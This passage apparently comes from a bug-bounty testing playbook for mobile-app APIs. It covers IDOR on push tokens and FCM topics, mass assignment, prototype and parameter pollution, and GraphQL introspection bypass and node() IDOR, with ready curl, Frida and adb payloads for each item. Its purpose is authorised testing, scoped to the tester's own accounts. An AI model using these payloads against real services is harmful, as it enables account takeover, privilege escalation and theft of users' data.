- **Proof:** The unauthenticated fetch returning the victim's profile JSON **with `X-Cache: HIT` / a non-zero
  `Age`** proving it came from cache; or a second client receiving the poisoned response. Two concurrent
  distinct users on the identical URL is the clean demonstration.
- **Escalation:** → mass exposure (every user hitting the cached path); poisoning the app's remote-config
  endpoint can repoint the whole user base → D14/D17.
- **Ruled out when:** Authenticated responses are `Cache-Control: private, no-store`, `Vary` includes the
  credential header, and the extension-suffixed path returns 404 rather than the JSON body.

### D15-055 · Push-token and device registration accepting another user's identifier

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when notification content carries OTPs or message bodies |
| **Attacker** | AM-05 |
| **Applies to** | all apps with push |
| **Maps to** | API1:2023; ATT&CK T1636.004 for the OTP target |

- **Test:** The `/devices` or `/push/register` endpoint takes an FCM token and a device id. If it does not bind
  them to the caller's own session — or lets you *supply* a user id, or register a token you did not generate —
  you either redirect a victim's notifications to your device or inject notifications into theirs. Deleting
  another user's device is a targeted DoS and a forced logout.
- **How:**
  ```bash
  curl -s -i -X POST https://api.target/v1/devices -H "Authorization: Bearer $MY_TOK" \
    -H 'Content-Type: application/json' -d '{"user_id":"'"$ID_B"'","fcm_token":"'"$MY_FCM"'","device_id":"'"$MY_DEV"'"}'
  curl -s -i -X POST https://api.target/v1/devices -H "Authorization: Bearer $MY_TOK" \
    -H 'Content-Type: application/json' -d '{"fcm_token":"'"$B_FCM"'","device_id":"'"$B_DEV"'"}'
  curl -s -i -X DELETE https://api.target/v1/devices/$B_DEV -H "Authorization: Bearer $MY_TOK"
  ```
- **Proof:** A notification intended for account B arriving on your device (screenshot the notification with
  its content), or a 200/204 on the DELETE of a device id that is not yours, confirmed by B's device list.
- **Escalation:** Notification content routinely contains OTPs, message bodies and transaction details → D13
  ATO. → D24 for the push-payload handling side.
- **Ruled out when:** The registration endpoint derives the subject from the session and rejects a supplied
  `user_id`, and device ids are scoped so a foreign one returns a distinct 403/404.

### D15-056 · FCM topic namespace derived from a guessable identifier

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) → P1 where it harvests OTPs/PII at scale |
| **Attacker** | AM-05 (any user of the app) |
| **Applies to** | any app using FCM topics; not applicable to token-addressed messaging only |
| **Maps to** | API1:2023 — topic naming is a client-side construct with **no server-side ACL** |

- **Test:** `subscribeToTopic()` is a **client-side** call with no server authorisation. If the app subscribes
  to `user_<id>`, `order_<id>` or `account_<hash>`, any user of the app can subscribe to any other user's topic
  and receive their messages, at scale.
- **How:**
  ```bash
  grep -rnE 'subscribeToTopic|/topics/|unsubscribeFromTopic' $S -B4 -A4
  ```
  ```javascript
  Java.perform(function () {
    var M = Java.use('com.google.firebase.messaging.FirebaseMessaging');
    M.getInstance().subscribeToTopic('user_' + '<ID_B>');
    console.log('subscribed');
  });
  ```
  Or call the IID/FCM REST subscribe with your own registration token and the other account's topic.
- **Proof:** A message addressed to account B arriving on your device; capture the notification and the
  `FirebaseMessagingService.onMessageReceived` payload from logcat.
- **Escalation:** → mass OTP/PII harvesting by subscribing to `user_1` … `user_N` → D13.
- **Ruled out when:** No topic subscription exists, or every topic name is a high-entropy server-issued value
  that the client never derives locally — read the call site, do not infer it from the topic string you saw
  once.

### D15-057 · Notification-preference and unsubscribe endpoints keyed on a guessable identifier

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High as the chain component that makes an ATO silent |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | all |
| **Maps to** | API1:2023 (no external identifier verified in the corpus for this specific surface) |

- **Test:** Notification settings and email/SMS unsubscribe links are usually the least-protected endpoint in
  the product — often a `GET` with only a user id or an unsigned token. Cross-user preference changes are a
  silent, durable griefing primitive that also suppresses security alerts.
- **How:**
  ```bash
  curl -s -i -X PUT https://api.target/v1/me/notification-preferences -H "Authorization: Bearer $A" \
    -H 'Content-Type: application/json' -d '{"user_id":"'"$ID_B"'","security_alerts":false,"login_alerts":false}'
  curl -s -i "https://api.target/unsubscribe?uid=$ID_B&all=1"        # no auth at all
  ```
- **Proof:** Account B's preferences read back changed **from B's own session**, and a subsequent security
  event producing no alert.
- **Escalation:** Pair with any ATO chain and re-rate **the chain**, not the primitive — disabling login and
  withdrawal alerts is the step that makes a takeover silent.
- **Ruled out when:** The preference write ignores a supplied user id, and the unsubscribe token is a signed,
  per-address value that fails for a different address.

### D15-058 · Feed locally-harvested identifiers into the IDOR sweep

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | per the object; the identifiers themselves are Support |
| **Attacker** | AM-03 (a zero-permission local app harvesting the ids) → AM-05 (using them) |
| **Applies to** | all |
| **Maps to** | API1:2023; ATT&CK T1533 Data from Local System |

- **Test:** Close the loop between the client-side domains and this one: identifiers harvested locally —
  exported ContentProvider rows (D07), logcat (D20), deep-link parameters (D09), the local database (D11), push
  payloads (D24) — are exactly the object ids the API authorises on, and they are the leak path that defeats
  the GUID AC:H penalty (D15-039).
- **How:**
  ```bash
  adb shell content query --uri content://com.target.app.provider/users | tee ids.txt
  adb logcat -d --pid=$(adb shell pidof -s com.target.app) \
    | grep -oE '"[a-z_]*id"\s*:\s*"?[A-Za-z0-9-]+' | tee -a ids.txt
  grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|[0-9]{6,}' ids.txt | sort -u > objects.txt
  while read -r id; do
    curl -s -o /dev/null -w "%{http_code} $id\n" -H "Authorization: Bearer $MY_TOKEN" \
      "https://api.target.com/v1/users/$id"
  done < objects.txt
  ```
- **Proof:** HTTP 200 for an object belonging to a second owned account whose id you obtained only from the
  local surface — include the differing response bodies and the local capture.
- **Escalation:** This is the join that turns a P5-ceiling local leak into a P1 server-side finding; file the
  local primitive and the server-side consumer as separate issues, then link them (D15-060).
- **Ruled out when:** The local surfaces expose no server object ids (only local row ids that the API does not
  accept), demonstrated by feeding them to the API and receiving a consistent 400/404 that differs from the
  valid-id shape.

### D15-059 · Test the destructive verbs deliberately

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2); P1 with read |
| **Attacker** | AM-05 |
| **Applies to** | all ID-bearing endpoints |
| **Maps to** | API1:2023; H1 #1819832 ($15,000), #1213237 ($5,000), #757095 ($1,000) |

- **Test:** DELETE, unlink, revoke, transfer, cancel and "remove member" IDORs are under-tested and pay the
  most, because teams review the read path and forget the destructive one. Do this **only against objects you
  created in your own second account for the purpose**, and restore state afterwards.
- **How:** For every object type, create a throwaway in account B, then from account A attempt:
  `DELETE /v1/<type>/<id>`, `POST /v1/<type>/<id>/cancel`, `POST /v1/<type>/<id>/unlink`,
  `POST /v1/<type>/<id>/transfer {"to":"<A>"}`, `DELETE /v1/orgs/<org>/members/<B>`.
- **Proof:** The object gone from account B's own session, with the throwaway's marker recorded before and
  after. Follow the five-screenshot state-change pattern (D15-033).
- **Escalation:** Destructive cross-account actions are also a safety/abuse story programs rate above their raw
  technical severity.
- **Ruled out when:** Every destructive verb on a foreign id returns a rejection with a distinct body and the
  object survives, checked from the owning session. Never test destructive verbs against a real third party's
  object, even if the program says the account is theirs.

### D15-060 · The operator-level composition question — read-IDOR into the three terminal chains

| | |
|---|---|
| **Severity ceiling** | Critical (composed); Medium standalone |
| **VRT** | composed: `broken_authentication_and_session_management.authentication_bypass` (P1), `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1), or `server_security_misconfiguration.exposed_portal.admin_portal` (P1) |
| **Attacker** | AM-05 |
| **Applies to** | all |
| **Maps to** | `hunt-idor` operator-level pattern and Chain 6; H1 #394329 ($8,000, cross-user parameter tampering in billing/subscription), #415081 ($10,500, adding privileged secondary users to another owner's business account) |

- **Test:** When you confirm a read-IDOR at A, immediately ask: *what state-change accepts the same id, and
  might also be IDOR'd?* The chain is almost always one of three — (1) password reset / email change at the
  terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role change / membership add →
  privilege escalation. The second half is usually *easier* to find because it shares the same auth bug class.
- **How:** Enumerate every endpoint that consumes the same identifier type, then run the double-IDOR shape:
  ```bash
  curl -s "https://api.example.com/v1/users/$ID_B/orders" -H "Authorization: Bearer $TOKEN_A" | jq -r '.[].id'
  curl -s -i -X POST "https://api.example.com/v1/orders/$HARVESTED_ID/refund" -H "Authorization: Bearer $TOKEN_A"
  ```
- **Proof:** The second half demonstrated end to end, with the ledger/role/credential state read back.
- **Escalation:** **Chain-filing order:** file the primitives first so their ids exist, then the consumer, then
  backfill the links. One fix equals one bounty; a chain is a severity amplifier, not a merge request.
- **Ruled out when:** No state-changing endpoint accepts the same identifier class, or each one re-derives the
  subject from the session — checked against all three terminal categories explicitly, not just the one you
  thought of. **If your read-IDOR does not compose, the standalone payout is what you get; say so in the
  report rather than over-claiming.**

### D15-061 · Broken function-level authorisation: role-crossing endpoints shipped in one binary

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES, CWE-269); `server_security_misconfiguration.exposed_portal.admin_portal` (P1) when it unlocks an admin surface |
| **Attacker** | AM-05 |
| **Applies to** | all multi-role products; **the most under-tested area in mobile engagements because the UI never reveals the endpoints** |
| **Maps to** | API5:2023 Broken Function Level Authorization ("complex access controls with unclear separation between administrative and regular functions"); Mobile Top 10 2024 M3 (its attack vector is "authenticate as legitimate users then force-browse to a vulnerable endpoint to execute administrative functionality") |

- **Test:** Mobile apps for two-sided marketplaces (buyer/seller, rider/driver, patient/clinician) ship **one**
  binary containing **both** roles' endpoints, gated by a UI flag. Call the other role's endpoints with your
  token.
- **How:**
  ```bash
  grep -iE 'seller|merchant|driver|partner|admin|internal|ops|staff|manage|backoffice|impersonat|sudo' endpoints.txt > role_routes.txt
  python3 - <<'PY'
  import os, subprocess
  tok = os.environ['BUYER_TOKEN']
  routes = [l.strip().strip('"') for l in open('role_routes.txt') if l.strip()]
  for r in routes:
      p = subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
                          '-H', 'Authorization: Bearer ' + tok,
                          'https://api.example.com/' + r.lstrip('/')],
                         capture_output=True, text=True)
      print(p.stdout, r)
  print('probes:', len(routes))          # must equal len(routes)
  PY
  ```
- **Proof:** 200 on a role-restricted endpoint with a token whose claims carry the lower role — show the
  decoded token next to the response body containing privileged data or a completed privileged action.
- **Escalation:** An admin list endpoint gives you the id space for the BOLA sweep; the two combine into
  "read/modify any account". Always retest against **every host** in the inventory — authorisation middleware
  is frequently per-service.
- **Ruled out when:** Every role-crossing route returns 403 with a body distinct from the authorised body, for
  a token whose decoded claims you show, on every host. A 404 on an unknown route is not evidence of
  authorisation.

### D15-062 · Hidden functionality gated only by the client not rendering a button

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES); `cloud_security.misconfigured_services_and_apis.exposed_debug_or_admin_interfaces` (VARIES) |
| **Attacker** | AM-05 |
| **Applies to** | all |
| **Maps to** | API5:2023; Cobalt's OWASP Mobile Top 10 2024 detection step ("test authorization checks on backend hidden functionality, assuming that the hidden functionality will only be accessed by a user with the appropriate role") |

- **Test:** Feature flags, remote config and `isPremium`/`isAdmin` booleans decide what the UI draws. They do
  not decide what the API serves. Flip the flag to *discover* the request shape, then prove the server accepts
  it **without** instrumentation.
- **How:**
  ```bash
  grep -rnE 'isPremium|isAdmin|hasFeature|canEdit|entitlement|featureFlag|BuildConfig\.ENABLE|RemoteConfig\.getBoolean' $S -B4 -A6
  ```
  ```javascript
  Java.perform(function () {
    var F = Java.use('com.target.FeatureFlags');
    F.isEnabled.implementation = function (n) { console.log('[flag] ' + n + ' -> true'); return true; };
  });
  ```
  Capture the request the unlocked UI produces, then replay it from Burp/curl on an un-instrumented client.
- **Proof:** The privileged request succeeding against the unmodified server from an account that is not
  entitled (200 plus the privileged resource). **The Frida patch is only the discovery mechanism — the report
  must show the server accepting the request without instrumentation.**
- **Escalation:** → D23 entitlement fraud; → D15-061 when the flag reveals an admin route.
- **Ruled out when:** The replayed request is rejected server-side on entitlement grounds with a distinct body,
  proving the flag is a UI hint over a server-enforced decision.

### D15-063 · Client-side authorisation the architecture cannot enforce — response-field tampering

| | |
|---|---|
| **Severity ceiling** | High to Critical for the server-side effect; the UI-only change alone is Low |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES) |
| **Attacker** | AM-05 |
| **Applies to** | all |
| **Maps to** | ATT&CK T1641 Data Manipulation; AOSP Application Sandbox (the app process is fully under the device owner's control once instrumented); MASTG-TEST-0338 / MASWE-0057 for the stored-state variant |

- **Test:** Anything the app decides in-process — role, entitlement, price, limit, KYC state — is advisory.
  Enumerate every **server response field** the app branches on, flip it in the proxy, and then separately
  replay the *request* that the unlocked UI produces to get the server's own answer. The UI change is not the
  finding; the server accepting the consequent request is.
- **How:**
  ```bash
  grep -RnE '"(role|isAdmin|isPremium|entitlement|tier|limit|balance|canWithdraw|kycStatus)"' $S | head -40
  # Burp: Proxy > Options > Match and Replace on the response body, e.g. "isPremium":false -> "isPremium":true
  # then replay the resulting request WITHOUT the match-and-replace rule active
  ```
  The local-storage variant is the same question on disk:
  ```bash
  adb shell run-as com.target.app sed -i 's/"premium">false/"premium">true/' \
    /data/data/com.target.app/shared_prefs/settings.xml
  ```
- **Proof:** The unlocked action returning 200 with a real server-side effect — a new row, a transfer, a
  downloaded premium asset — not just a changed screen.
- **Escalation:** → D23 entitlement fraud; a flipped flag that gates a *security* control rather than a feature
  is Critical.
- **Ruled out when:** The server re-derives the decision and rejects the consequent request. State that
  explicitly — "the finding is client-side only" — and move on; MASTG's framing for the storage variant is
  useful for triage: private-sandbox data "can still be tampered with in local attack scenarios, such as on
  rooted devices, during dynamic analysis, through backups, or by directly manipulating the app's data
  directory" — name which path your PoC used.

### D15-064 · Mass assignment on the profile/settings endpoint, with field names from three sources

| | |
|---|---|
| **Severity ceiling** | Critical (when it reaches a role or entitlement field) |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES, CWE-269); escalates to `server_security_misconfiguration.exposed_portal.admin_portal` (P1) when it unlocks an admin surface |
| **Attacker** | AM-05 |
| **Applies to** | any JSON-merge update endpoint |
| **Maps to** | API3:2023 — the "mass assignment" sub-case (formerly API6:2019), with the documented scenarios `"total_stay_price": "$1,000,000"` and `"blocked": false`; Mobile Top 10 2024 M3; ATT&CK T1641 |

- **Test:** A profile/settings/account endpoint merges the JSON body into the user object. Expected fields
  `name`, `email`; the attacker adds `role`, `is_verified`, `email_verified_at`, `owner_id`. Servers'
  `[FromBody]` binders accept them when DTOs are not split into read-vs-write models. **Do not guess field
  names** — take them from three authoritative sources: the client's model classes (D15-004), the fields the
  server *returns* (D15-046 — every property the server returns is a property it may accept), and
  `jq '.components.schemas' swagger.json` if a spec is reachable (D15-018).
- **How:**
  ```bash
  curl -s -X PATCH https://api.example.com/v1/me -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"displayName":"'"$MARK"'","role":"admin","isAdmin":true,"verified":true,"emailVerified":true,
         "permissions":["*"],"accountTier":"premium","walletBalance":999999,"tenantId":"'"$TENANT_B"'"}' -i
  # the read-back is the finding, not the 200:
  curl -s https://api.example.com/v1/me -H "Authorization: Bearer $TOKEN" | jq '{role,isAdmin,emailVerified,accountTier,walletBalance}'
  ```
  Send security-relevant fields **one at a time** once you have a hit, so the report names exactly which field
  the binder honours.
- **Proof:** Fetch the object back with a **separate GET** and show the field landed, then perform an action
  the new privilege enables (a previously-403 endpoint now returning 200). **A 200 with the field silently
  ignored downstream is not a finding.**
- **Escalation:** → admin API → `exposed_portal.admin_portal` (P1); an `isPremium`/`tier` field the server
  accepts is also a payments finding (→ D23), not only an access-control one.
- **Ruled out when:** Every injected field is absent from the separate GET, and the response object echoes only
  the fields the DTO declares — checked against the full three-source field list, not a guessed shortlist.

### D15-065 · Mass assignment at registration, including the nested-object form

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES); `broken_authentication_and_session_management.authentication_bypass` (P1) where `emailVerified:true` skips the verification gate |
| **Attacker** | AM-01 (registration is usually unauthenticated) |
| **Applies to** | all |
| **Maps to** | API3:2023; PortSwigger API testing — "identify hidden parameters by examining object fields returned in API responses … test by adding suspected parameters to PATCH/POST" |

- **Test:** Account creation is the highest-value mass-assignment target, because a single extra field can grant
  a role or mark an account verified before any control has run. Many frameworks bind **nested** objects even
  when they filter top-level keys.
- **How:**
  ```bash
  curl -s -i -X POST https://api.example.com/v1/users -H 'Content-Type: application/json' -d '{
    "email":"you+ma@example.com","password":"…","name":"t",
    "role":"admin","isAdmin":true,"emailVerified":true,"phoneVerified":true,
    "accountType":"MERCHANT","kycStatus":"APPROVED","creditBalance":100000}'
  # nested variants, which bypass top-level allow-lists
  -d '{"email":"…","password":"…","user":{"role":"admin"}}'
  -d '{"email":"…","password":"…","profile":{"kycStatus":"APPROVED"}}'
  curl -s https://api.example.com/v1/me -H "Authorization: Bearer $NEW_TOKEN" | jq .
  ```
- **Proof:** `GET /v1/me` on the freshly created account returning the elevated property, then a privileged
  endpoint accepting that account.
- **Escalation:** `emailVerified:true` at registration typically skips the OTP/verification gate entirely,
  which is also an **account-squatting** primitive against addresses you do not own — and that is a different,
  higher-impact report than "a field was bound" (→ D13).
- **Ruled out when:** Neither the flat nor the nested form changes any privileged property on the created
  account, and the verification gate still fires (the OTP is still required). Test both forms; a top-level
  allow-list that misses nested binding is the common shape.

### D15-066 · Mass assignment plus IDOR on team membership = cross-tenant privilege escalation

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-05 |
| **Applies to** | multi-user/org products |
| **Maps to** | API1:2023 + API3:2023 combined; `hunt-idor` Chain 4; H1 #981472 ($2,000, undocumented `fileCopy` mutation), #1066203 (cross-tenant `UpdateAtlasApplicationPerson`) |

- **Test:** The most efficient takeover chain on team-management APIs: the IDOR gets you into the victim team,
  the mass assignment sets your role. Team/org endpoints are where an IDOR escalates to privilege rather than
  to a data read, because the object *is* the account.
- **How:**
  ```bash
  curl -s -i -X POST "https://api.example.com/api/teams/$TEAM_B/members" -H "Authorization: Bearer $TOKEN_A" \
    -H 'Content-Type: application/json' \
    -d '{"email":"attacker+'"$MARK"'@example.com","role":"OWNER","permissions":["*"]}'
  curl -s "https://api.example.com/api/teams/$TEAM_B/members" -H "Authorization: Bearer $TOKEN_B" | jq .
  ```
- **Proof:** The attacker listed as OWNER of the other owned team, read from that team's own session, followed
  by an owner-only action succeeding.
- **Escalation:** The terminal step is removing the real owners — **do not perform it**; state it as the
  demonstrated capability. → D15-060 for the chain-filing order.
- **Ruled out when:** The membership endpoint rejects a foreign team id, and the `role`/`permissions` fields are
  ignored in favour of a server-side default for the inviter's own team — both checked.

### D15-067 · Sync conflict resolution driven by a client-supplied timestamp or version

| | |
|---|---|
| **Severity ceiling** | High (collaborative, medical-record or order-management contexts); Medium otherwise |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) where it overwrites another principal's content |
| **Attacker** | AM-05 |
| **Applies to** | all offline/sync-capable apps |
| **Maps to** | API1:2023; API3:2023 (no external identifier verified in the corpus for this specific surface) |

- **Test:** Offline-capable apps resolve conflicts with last-write-wins on a timestamp the *client* sends, or
  with a client-sent version/`etag`. A future-dated write silently wins forever, and the owner's subsequent
  legitimate edits are discarded as "older" — silent data destruction the victim cannot correct.
- **How:**
  ```bash
  grep -rnE 'updatedAt|client_ts|lastModified|revision|version|_rev|etag|If-Match|If-Unmodified-Since|conflictResolution|lastWriteWins' $S
  curl -s -i -X PUT https://api.target/v1/docs/$DOC -H "Authorization: Bearer $T" \
    -H 'Content-Type: application/json' \
    -d '{"content":"'"$MARK"'","updated_at":"2099-01-01T00:00:00Z","version":999999}'
  ```
- **Proof:** The server accepts the future-dated write, then the owner's own later edit returns 200 while a
  fresh `GET` still returns your marker.
- **Escalation:** In a shared document/order model this is cross-user data manipulation; combine with the
  offline-queue tampering item in D11 for a local delivery path.
- **Ruled out when:** The server stamps `updated_at` itself and rejects or ignores the client value, or the
  version is a server-issued opaque token whose out-of-range value is rejected with a distinct error.

### D15-068 · Server-side prototype pollution — pollute, then prove the sink

| | |
|---|---|
| **Severity ceiling** | Critical (RCE on Node); High for a privilege flip |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) at the RCE end; `broken_access_control.privilege_escalation` (VARIES) for the flag flip |
| **Attacker** | AM-05 |
| **Applies to** | Node/Express backends |
| **Maps to** | API3:2023 (the object-merge mechanism); API8:2023 |

- **Test:** Do not stop at a 200 on `__proto__`. Prove that polluted prototype state reaches a **later**
  operation, on a different request. This is the mass-assignment family's most dangerous member because the
  merge target is the language's own object prototype.
- **How:** Find an object-update endpoint accepting many named fields (profile, address, preferences, settings,
  cart, import, webhook config), pollute a harmless marker, then trigger a separate sink and diff:
  ```bash
  M=pp$(openssl rand -hex 4)
  for p in '{"__proto__":{"polluted":"'"$M"'"}}' '{"constructor":{"prototype":{"polluted":"'"$M"'"}}}'; do
    curl -s -o /dev/null -w '%{http_code} ' -X POST https://api.example.com/v1/settings \
      -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d "$p"
  done
  # form variants: __proto__[polluted]=$M   constructor[prototype][polluted]=$M
  curl -s https://api.example.com/v1/me -H "Authorization: Bearer $TOKEN" | grep -c "$M"   # a DIFFERENT request
  ```
  Strong signals on the sink: changed JSON defaults, unexpected fields, errors mentioning object properties,
  changed job output, template/render errors. Escalate only through *learned* sinks
  (`{"__proto__":{"json spaces":10}}`, `{"__proto__":{"status":555}}`, `{"__proto__":{"isAdmin":true}}`).
- **Proof:** The marker or behaviour change observed on a *different* request than the polluting one.
- **Escalation:** → Node gadget chains (lodash, mongoose) and AST injection for RCE. **In production, stop at a
  controlled marker unless scope explicitly permits more.**
- **Ruled out when:** No sink reflects the pollution after ten different follow-up requests, or the backend is
  not JavaScript (confirm from error signatures/headers, not assumption), or the merge is a typed
  deserialisation (the D15-027 type signature).

### D15-069 · Server-side parameter pollution in backend URL construction

| | |
|---|---|
| **Severity ceiling** | Critical (when it yields another user's reset token) |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) → `broken_authentication_and_session_management.authentication_bypass` (P1) when it yields a credential |
| **Attacker** | AM-05 |
| **Applies to** | frontends and BFFs that proxy to an internal REST API — **extremely common behind mobile backends** |
| **Maps to** | API8:2023; PortSwigger API testing — server-side parameter pollution |

- **Test:** The server interpolates your input into a *backend* URL path or query
  (`/api/internal/users/<username>/field/email`). This is not client-side query pollution: the errors are
  routing feedback from an internal router, and you navigate by them.
- **How:**
  ```bash
  curl -s "$URL?userId=$ID_A%26role=admin" -H "Authorization: Bearer $TOKEN"   # %26 = &
  curl -s "$URL?userId=$ID_A%23"           -H "Authorization: Bearer $TOKEN"   # %23 = # truncation
  curl -s "https://api.example.com/v1/users/$ID_A%2f..%2fadmin/config" -H "Authorization: Bearer $TOKEN"
  # then traverse using the error text as feedback
  # username=administrator%23
  # username=administrator%2f..%2fvictimuser
  # username=administrator/field/passwordResetToken%23
  ```
  Distinct errors (`Invalid route`, `API definition`, `unsupported field`, a changed returned field set) mean a
  server-side URL router is interpreting your value.
- **Proof:** A sensitive field for another principal (a reset token or secret), then used in the normal flow.
  **Do not stop at `Invalid route`** — use the errors as routing feedback.
- **Escalation:** Errors naming an "API definition" → probe `/openapi.json`, `/swagger.json`, `/v3/api-docs`
  (D15-018) to recover valid resource and field names.
- **Ruled out when:** Every metacharacter variant returns the same normalised response as the clean value, and
  the error taxonomy shows no internal router (a single generic 400 for every malformed variant is the
  D15-027 typed-validation signature).

### D15-070 · GraphQL schema recovery: introspection, its bypasses, and suggestion mining

| | |
|---|---|
| **Severity ceiling** | Low alone — **P5**; High/Critical via the consequence it unlocks |
| **VRT** | `sensitive_data_exposure.graphql_introspection_enabled` (**P5**) for the exposure itself |
| **Attacker** | AM-01 |
| **Applies to** | GraphQL backends |
| **Maps to** | PortSwigger GraphQL (universal `{__typename}` probe, introspection, special-character and method bypasses, suggestions/Clairvoyance); mitigation is Apollo Server v4+ `hideSchemaDetailsFromClientErrors` |

- **Test:** Confirm the endpoint is GraphQL, then recover the schema — by introspection if it is enabled, by a
  naive-block bypass if it is filtered, and by field-suggestion mining if it is genuinely off. Operators who
  stop at "introspection is disabled" miss the resolver-authz bugs that actually pay.
- **How:**
  ```bash
  curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
  curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{queryType{name}}}"}'
  # newline after __schema defeats a regex block
  curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
       --data-binary $'{"query":"query{__schema\\n{queryType{name}}}"}'
  # method / content-type variation
  curl -s -G https://api.example.com/graphql --data-urlencode 'query={__schema{queryType{name}}}'
  for p in /graphql /api /api/graphql /graphql/api /v1/graphql /query /gql; do
    printf '%s ' "$p"; curl -s -o /dev/null -w '%{http_code}\n' -X POST "https://api.example.com$p" \
      -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
  done
  # suggestions, when introspection is truly off
  curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
       -d '{"query":"{ userrr { id } }"}' | jq -r '.errors[].message'
  pip install clairvoyance && clairvoyance -o schema.json -w wordlist.txt https://api.example.com/graphql
  jq -r '.data.__schema.types[].name' introspection.json | grep -iE 'admin|internal|bypass|grant|role|secret|token'
  ```
  Cross-check against the operation names already recovered from the APK (D15-008) — the two together usually
  give the full mutation list.
- **Proof:** A full schema response (or a reconstructed one), **plus a consequence** — an undocumented mutation
  (`grantAdminAccess`, `setUserRole`, `bypassPaymentCheck`) reachable from a low-privilege session.
- **Escalation:** With the schema, enumerate every mutation the app never calls and test each for authz. That
  is where the Criticals are. **Introspection alone is on the never-submit list.**
- **Ruled out when:** `{"data":{"__schema":null}}` — which means introspection is **disabled**, not "worked but
  empty" — *and* suggestions are off (`hideSchemaDetailsFromClientErrors`), *and* the APK yields no operation
  documents. All three, or the schema is recoverable.

### D15-071 · Relay `node(id:)` global-object-handle IDOR, including cross-type confusion

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1); P3 for read-only |
| **Attacker** | AM-05 |
| **Applies to** | GitHub/Shopify/Facebook-style Relay APIs |
| **Maps to** | API1:2023 (its documented scenario is a GraphQL `deleteReports` mutation that "deletes documents using only their ID without permission checks"); H1 #1618347 ($25,000), #807448, #489146, #2207248 ($5,000 `BillingDocumentDownload`/`BillDetails`) |

- **Test:** The most-paid GraphQL bug class. Relay APIs expose `node(id: ID!)` returning any object by global
  id. Type-specific resolvers may enforce ownership; `node()` is the back door that does not. **GraphQL
  re-opens IDORs teams already fixed at the REST layer.**
- **How:**
  ```bash
  echo "VXNlcjox" | base64 -d          # -> User:1 ; change the numeric and re-encode
  printf 'User:%s' "$ID_B" | base64
  curl -s -X POST https://api.example.com/graphql -H "Authorization: Bearer $TOKEN_A" \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ node(id: \"'"$GID_B"'\") { ... on User { id email name role permissions } } }"}' | jq .
  # cross-type confusion: query a User id as a Repository
  -d '{"query":"{ node(id: \"'"$GID_USER"'\") { ... on Repository { name owner { login } } } }"}'
  # and the plural form
  -d '{"query":"{ nodes(ids: [\"'"$GID_B"'\"]) { __typename } }"}'
  ```
- **Proof:** Cross-account or cross-tenant data returned, marker-verified against the second owned account.
- **Escalation:** Relay relation traversal — `orders { paymentMethods { cardLast4 } }` — because the top-level
  resolver authorises the requester but nested relations do not re-check ownership against the *resolved*
  object. Low integers are where admin accounts live.
- **Ruled out when:** `node`/`nodes` are absent from the schema, or they re-run the same ownership check as the
  typed resolver for every type you tried (test at least three types, including one you do not own).

### D15-072 · GraphQL field-level and nested-path authorisation

| | |
|---|---|
| **Severity ceiling** | Critical (password hashes or auth tokens); High otherwise |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) → `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when it returns credentials |
| **Attacker** | AM-05 |
| **Applies to** | all GraphQL |
| **Maps to** | API3:2023 (its documented scenario is a `reportUser` mutation returning the reported user's `fullName` and `recentLocation`); API1:2023 |

- **Test:** GraphQL resolvers authorise per *field*, and teams routinely protect the top-level query while
  leaving a nested edge unprotected. Probe **every** field on shared types (`User`, `Program`, `Account`), not
  just what the app selects, and reach sensitive leaves through *different* paths.
- **How:**
  ```bash
  curl -s -X POST https://api.example.com/graphql -H "Authorization: Bearer $TOKEN_A" \
    -H 'Content-Type: application/json' \
    -d '{"query":"{ me { id email passwordHash recoveryCodes apiToken } }"}' | jq .
  # a different path to the same leaf
  -d '{"query":"{ me { organization { members { email phone } } } }"}'
  # direct object access by id under A's token
  -d '{"query":"{ user(id: \"'"$ID_B"'\") { id email phone addresses { line1 } } }"}'
  # and a mutation that takes only an id
  -d '{"query":"mutation { deleteReports(reportKeys: [\"'"$B_REPORT"'\"]) }"}'
  ```
- **Proof:** A sensitive field returned that the docs call admin-only, or account B's fields under A's token,
  marker-verified.
- **Escalation:** Recovery codes or an API token → MFA bypass → ATO (→ D13). A traversal that reaches every
  organisation member turns one IDOR into a bulk export.
